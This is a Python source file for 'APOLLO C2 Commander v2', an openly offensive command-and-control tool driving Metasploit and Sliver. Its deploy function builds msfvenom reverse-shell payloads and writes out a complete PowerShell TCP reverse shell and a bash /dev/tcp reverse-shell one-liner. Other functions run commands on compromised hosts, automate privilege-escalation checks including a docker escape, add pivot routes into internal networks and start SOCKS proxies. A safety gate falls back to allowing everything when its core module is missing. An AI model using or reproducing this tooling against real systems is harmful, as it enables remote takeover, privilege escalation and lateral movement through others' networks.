#!/usr/bin/env python3
"""
APOLLO C2 Commander v2 - Unified command & control with real RPC integration.
Features:
  - pymetasploit3 RPC (not raw msgpack) for all MSF operations
  - Sliver client integration
  - Agent deployment (msfvenom payload generation + stagers)
  - Auto-privesc with real post-module execution
  - Pivot network detection with autoroute setup
  - Batch command execution + session health monitoring
  - Multi-listener management
"""
import sys, os, json, subprocess, re, time, tempfile, threading
from datetime import datetime, timedelta
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from kb_manager import (init_db, get_connection, get_active_project,
                        get_project_id, create_event, log_command,
                        add_c2_session, update_c2_session, add_c2_command,
                        get_c2_sessions, add_host, add_credential)

try:
    from apollo_core.safety import preflight as _preflight
    _CORE_AVAILABLE = True
except Exception:  # pragma: no cover - module still runs without core
    _CORE_AVAILABLE = False


def _gate(action, target="", intrusive=True):
    """Safety gate for an active C2 operation.

    Returns ``(allowed, dry_run, reason)``. C2 actions are intrusive, so with
    APOLLO_REQUIRE_AUTH they need an authorized engagement, and APOLLO_DRY_RUN
    plans without executing. Listener/agent infrastructure passes an empty
    target (there is no remote host to scope-check); the decision is audited
    either way. Degrades to allow-all when the core is unavailable.
    """
    if not _CORE_AVAILABLE:
        return True, False, "core-unavailable"
    g = _preflight(action, target=target, intrusive=intrusive)
    return g.allowed, g.dry_run, g.reason

MSFRPCD_HOST = os.environ.get("MSFRPCD_HOST", "127.0.0.1")
MSFRPCD_PORT = int(os.environ.get("MSFRPCD_PORT", "55552"))
MSFRPCD_USER = os.environ.get("MSFRPCD_USER", "msf")
MSFRPCD_PASS = os.environ.get("MSFRPCD_PASS", "msf")
SLIVER_PATH = os.environ.get("SLIVER_PATH", os.path.expanduser("~/sliver-client.cfg"))
LHOST_DEFAULT = "0.0.0.0"
LPORT_DEFAULT = 4444
_local = threading.local()

PRIVESC_CHECKS = {
    "linux": [
        ("Kernel version", "uname -a"),
        ("OS release", "cat /etc/os-release 2>/dev/null | head -5"),
        ("Current user/id", "id; whoami"),
        ("Sudo perms", "sudo -l 2>/dev/null"),
        ("SUID binaries", "find / -perm -4000 -type f 2>/dev/null | head -20"),
        ("Capabilities", "getcap -r / 2>/dev/null | head -20"),
        ("Cron jobs", "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.* 2>/dev/null"),
        ("Writable paths", "find / -writable -type d 2>/dev/null | head -10"),
        ("Docker group", "id | grep -i docker"),
        ("Processes as root", "ps aux | grep '^root' | head -10"),
    ],
    "windows": [
        ("System info", "sysinfo"),
        ("Current user", "getuid"),
        ("Local exploits", "run post/multi/recon/local_exploit_suggester"),
        ("Privileges", "whoami /priv"),
        ("Network", "ipconfig /all"),
        ("Route table", "route print"),
        ("Scheduled tasks", "schtasks /query /fo TABLE 2>nul | findstr Ready"),
        ("Services", "sc query state= all"),
    ],
}


def _get_msf():
    """Get or create thread-local metasploit RPC client."""
    client = getattr(_local, 'msf_client', None)
    if client is None:
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
            client = MsfRpcClient(MSFRPCD_PASS, user=MSFRPCD_USER,
                                  server=MSFRPCD_HOST, port=MSFRPCD_PORT, ssl=False)
            _local.msf_client = client
        except ImportError:
            raise ImportError("pymetasploit3 required: pip install pymetasploit3")
        except Exception as e:
            raise ConnectionError(f"Cannot connect to msfrpcd at {MSFRPCD_HOST}:{MSFRPCD_PORT}: {e}")
    return client


def _run_local(cmd, timeout=60):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout, executable="/bin/bash")
        return (r.stdout + r.stderr).decode("utf-8", errors="ignore")
    except Exception as e:
        return f"Error: {e}"


def _get_lhost():
    try:
        r = subprocess.run("ip -4 route get 1.1.1.1 2>/dev/null | grep -oP 'src \\K[0-9.]+'",
                           shell=True, capture_output=True, text=True, timeout=5)
        ip = r.stdout.strip()
        return ip if ip else "127.0.0.1"
    except Exception:
        return "127.0.0.1"


def deploy_agent(lhost=None, lport=None, platform="linux", arch="x64", payload_type="meterpreter"):
    """Generate and optionally deploy a C2 agent payload."""
    lhost = lhost or _get_lhost()
    lport = lport or LPORT_DEFAULT
    allowed, dry, reason = _gate("c2_deploy_agent", "", intrusive=True)
    if not allowed:
        return {"blocked": True, "reason": reason, "lhost": lhost, "lport": lport}
    if dry:
        return {"dry_run": True, "action": "c2_deploy_agent", "platform": platform,
                "arch": arch, "payload_type": payload_type, "lhost": lhost, "lport": lport}
    output_dir = tempfile.mkdtemp(prefix="apollo_agent_")
    output_path = os.path.join(output_dir, f"agent_{platform}_{arch}")

    pay_map = {
        ("linux", "x64", "meterpreter"): "linux/x64/meterpreter/reverse_tcp",
        ("linux", "x64", "shell"): "linux/x64/shell_reverse_tcp",
        ("windows", "x64", "meterpreter"): "windows/x64/meterpreter/reverse_tcp",
        ("windows", "x64", "shell"): "windows/x64/shell_reverse_tcp",
        ("windows", "x86", "meterpreter"): "windows/meterpreter/reverse_tcp",
        ("linux", "x86", "meterpreter"): "linux/x86/meterpreter/reverse_tcp",
        ("java", "any", "meterpreter"): "java/meterpreter/reverse_tcp",
        ("php", "any", "meterpreter"): "php/meterpreter/reverse_tcp",
        ("python", "any", "meterpreter"): "python/meterpreter/reverse_tcp",
    }
    payload = pay_map.get((platform, arch, payload_type))
    if not payload:
        payload = f"{platform}/{arch}/{payload_type}/reverse_tcp"

    cmd = (f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} "
           f"-o {output_path} 2>&1")
    out = _run_local(cmd, 60)

    # Generate staged PowerShell loader for Windows
    ps_loader = ""
    if platform.startswith("win"):
        ps_loader = (
            f"$c = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};"
            f"while(($i = $s.Read($b, 0, $b.Length)) -ne 0)"
            f"{{;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$sb = (iex $d 2>&1 | Out-String );"
            f"$sb2 = $sb + 'PS ' + (pwd).Path + '> ';"
            f"$sbt = ([text.encoding]::ASCII).GetBytes($sb2);"
            f"$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()"
        )

    # Linux bash one-liner
    bash_loader = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport} <&1'"

    return {
        "payload": payload,
        "lhost": lhost,
        "lport": lport,
        "binary_path": output_path if os.path.exists(output_path) else None,
        "msfvenom_cmd": cmd,
        "msfvenom_output": out[:1000],
        "powershell_loader": ps_loader,
        "bash_loader": bash_loader,
        "setup_listener_cmd": f"python3 {sys.argv[0]} listen {lhost} {lport} '{payload}'",
    }


def setup_listener(lhost, lport, payload="windows/x64/meterpreter/reverse_tcp"):
    """Set up a Metasploit multi/handler listener via RPC."""
    allowed, dry, reason = _gate("c2_setup_listener", "", intrusive=True)
    if not allowed:
        return {"blocked": True, "reason": reason, "lhost": lhost, "lport": lport}
    if dry:
        return {"dry_run": True, "action": "c2_setup_listener", "lhost": lhost,
                "lport": lport, "payload": payload}
    try:
        client = _get_msf()
        # Create a new handler console
        cid = client.consoles.console()[b"id"].decode() if hasattr(client.consoles, 'console') else None
        if cid:
            client.consoles.console(cid).write(f"use multi/handler")
            client.consoles.console(cid).write(f"set PAYLOAD {payload}")
            client.consoles.console(cid).write(f"set LHOST {lhost}")
            client.consoles.console(cid).write(f"set LPORT {lport}")
            client.consoles.console(cid).write(f"set ExitOnSession false")
            client.consoles.console(cid).write(f"exploit -j -z")
            time.sleep(2)
            out = client.consoles.console(cid).read()
            client.consoles.console(cid).destroy()
        else:
            raise Exception("Console create returned None")
    except Exception as e:
        # Fallback to console
        out = _run_local(
            f"msfconsole -q -x 'use multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j' 2>&1",
            30)

    pid = get_project_id()
    create_event(pid, "listener", "c2_commander",
                 f"Started listener {lhost}:{lport} ({payload})",
                 {"lhost": lhost, "lport": lport, "payload": payload}, "info")
    return {"lhost": lhost, "lport": lport, "payload": payload, "output": str(out)[:500]}


def list_msf_sessions():
    """List active Metasploit sessions via RPC."""
    sessions = []
    try:
        client = _get_msf()
        msf_sessions = client.sessions.list
        if msf_sessions:
            for sid, info in msf_sessions.items():
                sessions.append({
                    "id": str(sid), "type": info.get("type", ""),
                    "ip": info.get("session_host", ""),
                    "platform": info.get("platform", ""),
                    "privilege": info.get("username", ""),
                    "via": info.get("via_exploit", ""),
                    "source": "metasploit"
                })
    except Exception as e:
        # Fallback to console parse
        out = _run_local("msfconsole -q -x 'sessions -l; exit' 2>&1", 30)
        for line in out.split("\n"):
            m = re.match(r"\s*(\d+)\s+(meterpreter|shell|powershell)\s+(\S+)\s+(\S+)", line)
            if m:
                sessions.append({"id": m.group(1), "type": m.group(2),
                                 "ip": m.group(3), "platform": m.group(4),
                                 "source": "metasploit"})
    return sessions


def list_sliver_sessions():
    sessions = []
    try:
        r = subprocess.run(f"sliver-client --config {SLIVER_PATH} sessions 2>/dev/null",
                           shell=True, capture_output=True, timeout=15, executable="/bin/bash")
        out = r.stdout.decode("utf-8", errors="ignore")
        for line in out.split("\n"):
            m = re.match(r"\s*([a-f0-9-]+)\s+(\S+)\s+(\S+)\s+(\S+)", line, re.IGNORECASE)
            if m:
                sessions.append({"id": m.group(1), "name": m.group(2),
                                 "ip": m.group(3), "source": "sliver"})
    except Exception:
        pass
    return sessions


def list_all_sessions(project_id=None):
    """Aggregate sessions from KB + Metasploit RPC + Sliver."""
    init_db()
    sessions = {"kb": [], "metasploit": [], "sliver": []}
    kb_sessions = get_c2_sessions(project_id, "active") if project_id else get_c2_sessions(status="active")
    sessions["kb"] = [{"id": s.get("session_id", ""), "ip": s.get("ip", ""),
                       "type": s.get("session_type", ""), "privilege": s.get("privilege", ""),
                       "platform": s.get("platform", ""), "source": "kb"} for s in kb_sessions]
    sessions["metasploit"] = list_msf_sessions()
    sessions["sliver"] = list_sliver_sessions()
    return sessions


def run_command_on_session(session_id, command, framework="auto", timeout=60):
    """Run a command on a specific session via RPC or framework CLI."""
    result = {"session": session_id, "command": command, "framework": framework, "output": ""}

    allowed, dry, reason = _gate("c2_run_command", "", intrusive=True)
    if not allowed:
        result.update({"blocked": True, "reason": reason})
        return result
    if dry:
        result.update({"dry_run": True, "output": "(dry-run: command not executed)"})
        return result

    if framework == "auto":
        if session_id.isdigit():
            framework = "metasploit"
        else:
            framework = "sliver"

    if framework == "metasploit":
        try:
            client = _get_msf()
            cid = client.consoles.console()[b"id"].decode()
            if cid:
                client.consoles.console(cid).write(f"sessions -i {session_id} -c '{command}'")
                time.sleep(2)
                data = client.consoles.console(cid).read()
                result["output"] = str(data.get(b"data", b"").decode("utf-8", errors="ignore"))
                client.consoles.console(cid).destroy()
        except Exception as e:
            # Fallback to shell
            result["output"] = _run_local(
                f"msfconsole -q -x 'sessions -i {session_id} -c \"{command}\"; exit' 2>&1", timeout)
    elif framework == "sliver":
        result["output"] = _run_local(
            f"sliver-client --config {SLIVER_PATH} use {session_id} -e '{command}' 2>&1", timeout)
    else:
        result["output"] = f"Unknown framework: {framework}"

    pid = get_project_id()
    add_c2_command(_get_session_db_id(session_id), command, result["output"][:500], 0)
    log_command(pid, command, "c2_commander", session_id, result["output"][:500], 0)
    return result


def _get_session_db_id(session_id):
    conn = get_connection()
    row = conn.execute("SELECT id FROM c2_sessions WHERE session_id=?", (session_id,)).fetchone()
    return row["id"] if row else 0


def auto_privesc(session_id, platform="linux", framework="auto"):
    """Run automated privilege escalation checks and suggest exploits."""
    checks = PRIVESC_CHECKS.get(platform, PRIVESC_CHECKS["linux"])
    results = []
    for name, cmd in checks:
        r = run_command_on_session(session_id, cmd, framework, timeout=30)
        results.append({"check": name, "command": cmd, "output": r["output"][:1000]})

    opportunities = []
    combined = json.dumps(results).lower()
    if "sudo" in combined and "nopasswd" in combined:
        opportunities.append({"technique": "sudo abuse", "mitre": "T1548.003",
                              "desc": "NOPASSWD sudo rule found", "action": "sudo -l, sudo su"})
    if "suid" in combined or "perm -4000" in combined:
        opportunities.append({"technique": "SUID binary", "mitre": "T1548.001",
                              "desc": "GTFOBins-worthy SUID binaries", "action": "check GTFO on each binary"})
    if "docker" in combined and ("root" in combined or "docker" in combined):
        opportunities.append({"technique": "Docker group", "mitre": "T1068",
                              "desc": "User in docker group -> escape", "action": "docker run -v /:/mnt alpine chroot /mnt"})
    if "cap_setuid" in combined or "cap_dac_override" in combined:
        opportunities.append({"technique": "Capabilities", "mitre": "T1068",
                              "desc": "Dangerous Linux capabilities"})
    if "system" in combined and "nt authority" in combined:
        opportunities.append({"technique": "Already SYSTEM", "desc": "Session already SYSTEM"})

    # Try local_exploit_suggester via RPC on MSF sessions
    if framework == "metasploit" or (framework == "auto" and session_id.isdigit()):
        try:
            client = _get_msf()
            cid = client.consoles.console()[b"id"].decode()
            client.consoles.console(cid).write(f"sessions -i {session_id}")
            client.consoles.console(cid).write("run post/multi/recon/local_exploit_suggester")
            time.sleep(5)
            data = client.consoles.console(cid).read()
            suggester_out = str(data.get(b"data", b"").decode("utf-8", errors="ignore"))
            client.consoles.console(cid).destroy()
            for line in suggester_out.split("\n"):
                if "exploit/" in line.lower() and ("OK" in line or "[+]" in line):
                    opportunities.append({"technique": "MSF local suggester", "mitre": "T1068",
                                          "desc": line.strip(), "action": line.strip().split()[0] if line.strip().split() else ""})
        except Exception:
            pass

    pid = get_project_id()
    create_event(pid, "auto_privesc", "c2_commander",
                 f"Privesc scan session {session_id}: {len(opportunities)} opportunities",
                 {"session": session_id, "opportunities": opportunities}, "high")
    return {"session": session_id, "checks": results, "opportunities": opportunities}


def detect_pivot_network(session_id, framework="auto", platform="linux"):
    """Detect internal networks and auto-configure Metasploit routes."""
    cmds = ([(f"Interfaces", f"ip addr 2>/dev/null || ifconfig 2>/dev/null"),
             ("Routes", "ip route 2>/dev/null || route -n 2>/dev/null"),
             ("ARP", "arp -a 2>/dev/null || ip neigh 2>/dev/null")]
            if platform == "linux" else
            [("Interfaces", "ipconfig"), ("Routes", "route print"), ("ARP", "arp -a")])

    results = {}
    for name, cmd in cmds:
        r = run_command_on_session(session_id, cmd, framework, timeout=30)
        results[name] = r["output"][:2000]

    subnets = set()
    for out in results.values():
        for m in re.finditer(r"(\d+\.\d+\.\d+)\.\d+", out):
            subnets.add(m.group(1) + ".0/24")

    # Auto-add routes via MSF RPC
    added_routes = []
    for subnet in subnets:
        try:
            client = _get_msf()
            cid = client.consoles.console()[b"id"].decode()
            client.consoles.console(cid).write(f"route add {subnet} {session_id}")
            time.sleep(1)
            client.consoles.console(cid).destroy()
            added_routes.append(subnet)
        except Exception:
            pass

    pid = get_project_id()
    create_event(pid, "pivot_detect", "c2_commander",
                 f"Detected {len(subnets)} subnets from session {session_id}, added {len(added_routes)} routes",
                 {"session": session_id, "subnets": list(subnets), "added_routes": added_routes}, "info")
    return {"session": session_id, "network_info": results,
            "detected_subnets": list(subnets), "routes_added": added_routes,
            "pivot_commands": _generate_pivot_commands(session_id, subnets)}


def _generate_pivot_commands(session_id, subnets):
    cmds = []
    for subnet in subnets:
        net = subnet.split("/")[0]
        cmds.append(f"# Route to {subnet}")
        cmds.append(f"msfconsole -q -x 'use post/multi/manage/autoroute; set SESSION {session_id}; set SUBNET {net}; run'")
    cmds.append("# SOCKS proxy through MSF")
    cmds.append("msfconsole -q -x 'use auxiliary/server/socks_proxy; set SRVHOST 127.0.0.1; set SRVPORT 1080; run -j'")
    cmds.append("# Proxychains via pivot")
    cmds.append("proxychains nmap -sT -Pn -sV <target>")
    return cmds


def batch_command(session_ids, command, framework="auto", timeout=60):
    results = []
    for sid in session_ids:
        r = run_command_on_session(sid, command, framework, timeout)
        results.append(r)
    return results


def session_health(project_id=None):
    init_db()
    sessions = get_c2_sessions(project_id, "active") if project_id else get_c2_sessions(status="active")
    health = []
    for s in sessions:
        last = s.get("last_seen", "")
        age_hours = 999
        try:
            if last:
                dt = datetime.fromisoformat(last.replace("Z", ""))
                age_hours = (datetime.utcnow() - dt).total_seconds() / 3600
        except Exception:
            pass
        status = "healthy" if age_hours < 1 else ("stale" if age_hours < 24 else "dead")
        health.append({"session_id": s.get("session_id", ""), "ip": s.get("ip", ""),
                       "last_seen": last, "age_hours": round(age_hours, 1), "status": status})
    return health


def start_socks_proxy(port=1080):
    """Start a SOCKS proxy via MSF for external tool pivoting."""
    try:
        client = _get_msf()
        cid = client.consoles.console()[b"id"].decode()
        client.consoles.console(cid).write(f"use auxiliary/server/socks_proxy")
        client.consoles.console(cid).write(f"set SRVHOST 127.0.0.1")
        client.consoles.console(cid).write(f"set SRVPORT {port}")
        client.consoles.console(cid).write(f"run -j -z")
        time.sleep(2)
        data = client.consoles.console(cid).read()
        client.consoles.console(cid).destroy()
        return {"port": port, "status": "started", "output": str(data.get(b"data", b"").decode())[:500]}
    except Exception as e:
        return {"port": port, "status": "error", "error": str(e)}


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("APOLLO C2 Commander v2")
        print("Usage:")
        print(f"  {sys.argv[0]} sessions [project]                - List all sessions")
        print(f"  {sys.argv[0]} run <session> <cmd> [framework]   - Run command")
        print(f"  {sys.argv[0]} privesc <session> [platform]      - Auto privesc")
        print(f"  {sys.argv[0]} pivot <session> [platform]        - Pivot detection")
        print(f"  {sys.argv[0]} health [project]                  - Session health")
        print(f"  {sys.argv[0]} listen <lhost> <lport> [payload]  - Setup listener")
        print(f"  {sys.argv[0]} deploy [lhost] [lport] [plat]     - Deploy agent")
        print(f"  {sys.argv[0]} socks [port]                      - Start SOCKS proxy")
        sys.exit(0)
    action = sys.argv[1]
    if action == "sessions":
        pid = get_project_id(sys.argv[2]) if len(sys.argv) > 2 else None
        print(json.dumps(list_all_sessions(pid), indent=2, default=str))
    elif action == "run":
        fw = sys.argv[4] if len(sys.argv) > 4 else "auto"
        print(json.dumps(run_command_on_session(sys.argv[2], sys.argv[3], fw), indent=2, default=str))
    elif action == "privesc":
        plat = sys.argv[3] if len(sys.argv) > 3 else "linux"
        print(json.dumps(auto_privesc(sys.argv[2], plat), indent=2, default=str))
    elif action == "pivot":
        plat = sys.argv[3] if len(sys.argv) > 3 else "linux"
        print(json.dumps(detect_pivot_network(sys.argv[2], "auto", plat), indent=2, default=str))
    elif action == "health":
        pid = get_project_id(sys.argv[2]) if len(sys.argv) > 2 else None
        print(json.dumps(session_health(pid), indent=2, default=str))
    elif action == "listen":
        payload = sys.argv[4] if len(sys.argv) > 4 else "windows/x64/meterpreter/reverse_tcp"
        print(json.dumps(setup_listener(sys.argv[2], int(sys.argv[3]), payload), indent=2, default=str))
    elif action == "deploy":
        lh = sys.argv[2] if len(sys.argv) > 2 else None
        lp = int(sys.argv[3]) if len(sys.argv) > 3 else None
        plat = sys.argv[4] if len(sys.argv) > 4 else "linux"
        print(json.dumps(deploy_agent(lh, lp, plat), indent=2, default=str))
    elif action == "socks":
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 1080
        print(json.dumps(start_socks_proxy(port), indent=2, default=str))
    else:
        print(f"Unknown action: {action}")
